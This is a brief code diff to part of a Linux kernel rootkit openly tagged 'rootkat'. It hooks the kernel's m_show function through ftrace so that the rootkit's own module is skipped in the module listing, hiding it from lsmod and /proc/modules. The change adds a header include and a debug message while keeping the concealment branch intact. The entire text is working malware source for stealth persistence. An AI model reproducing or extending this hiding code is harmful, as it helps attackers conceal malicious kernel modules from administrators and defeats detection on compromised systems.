@@ -3,6 +3,7 @@
 #include <linux/seq_file.h>
 #include <linux/kernel.h>
 #include "ftrace_hook.h"
+#include "hook_m_show.h"
 
 #define TAG "rootkat/hook_m_show: "
 
@@ -23,8 +24,10 @@ static int rootkat_m_show(struct seq_file *m, void *p)
 	struct module *mod = list_entry(p, struct module, list);
 	m_show_t orig = (m_show_t)hook_m_show.original;
 
-	if (mod && strcmp(mod->name, KBUILD_MODNAME) == 0)
-		return 0; /* skip our entry */
+	if (mod && strcmp(mod->name, KBUILD_MODNAME) == 0) {
+		pr_debug(TAG "skipped self-entry\n");
+		return 0;
+	}
 
 	return orig(m, p);
 }
